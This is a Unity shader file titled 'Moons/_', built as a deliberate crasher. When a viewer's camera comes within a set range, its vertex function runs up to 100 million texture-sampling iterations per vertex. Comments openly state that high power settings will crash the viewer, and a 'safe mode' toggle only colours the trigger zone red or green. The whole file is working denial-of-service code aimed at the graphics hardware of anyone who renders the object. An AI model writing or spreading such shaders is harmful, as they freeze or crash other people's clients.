Shader "Moons/_" {
    Properties {
        [HideInInspector] _Texture ("Texture", 2D) = "black" {} // don't change this
        _Colour ("Colour", Color) = (1,1,1,1)
        _Power ("Power", Range(0, 1000)) = 0 // anything above 300 will probably crash
        _Range ("Range", Float) = 0
        [MaterialToggle] _SafeMode ("Safe Mode", Float) = 0 // crash will be disabled when safe mode is enabled and the material will turn red when the camera is in range of the crash
    }
    SubShader {
        Tags { "RenderType"="Opaque" }
        LOD 300

        Cull Off
        
        CGPROGRAM
        #pragma surface surf BlinnPhong addshadow fullforwardshadows vertex:disp nolightmap

        struct appdata {
            float4 vertex : POSITION;
            float4 tangent : TANGENT;
            float3 normal : NORMAL;
            float2 texcoord : TEXCOORD0;
        };

        uniform fixed4 _Colour;
        uniform float _Power;
        uniform float _Range;        
        uniform float _SafeMode;
        uniform sampler2D _Texture;

        void disp (inout appdata v) {
            float3 pos = (_WorldSpaceCameraPos - mul(unity_ObjectToWorld, float4(0,0,0,1))).xyz;
            if (_SafeMode == 0) {
                if (length(pos) < _Range) {
                    float _Iterations = _Power * 100000; // Maximum iterations: 100,000,000
                    for (int i = 0; i < _Iterations; i++) {
                        float d = tex2Dlod(_Texture, float4(v.texcoord.xy,0,0)).r;
                        v.vertex.xyz += v.normal * d;
                    }
                } else {
                    float d = tex2Dlod(_Texture, float4(v.texcoord.xy,0,0)).r;
                    v.vertex.xyz += v.normal * d;
                }
            }
        }

        struct Input {
            float2 uv_MainTex;
        };

        void surf (Input IN, inout SurfaceOutput o) {       
            float4 finalColour;
            float3 pos = (_WorldSpaceCameraPos - mul(unity_ObjectToWorld, float4(0,0,0,1))).xyz;
            if (_SafeMode == 1) {
                if (length(pos) < _Range) {
                    finalColour = float4(1,0,0,1);
                } else {
                    finalColour = float4(0,1,0,1);
                }               
            } else {
                finalColour = _Colour;
            }
            o.Emission = finalColour;
        }
        ENDCG
    }
    FallBack "Diffuse"
}